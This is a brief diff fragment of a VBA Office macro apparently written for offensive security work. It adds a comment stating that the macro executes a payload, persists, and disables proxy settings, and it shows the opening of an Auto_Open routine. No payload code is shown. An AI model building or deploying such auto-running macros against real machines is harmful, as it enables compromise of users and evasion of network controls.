@@ -1,5 +1,6 @@
 ' Author: Matt Nelson
 ' Twitter: @enigma0x3
+'This code is a macro that executes a payload, persists and disables any proxy settings set on the client machine.
 
 Sub Auto_Open()
 Proxy
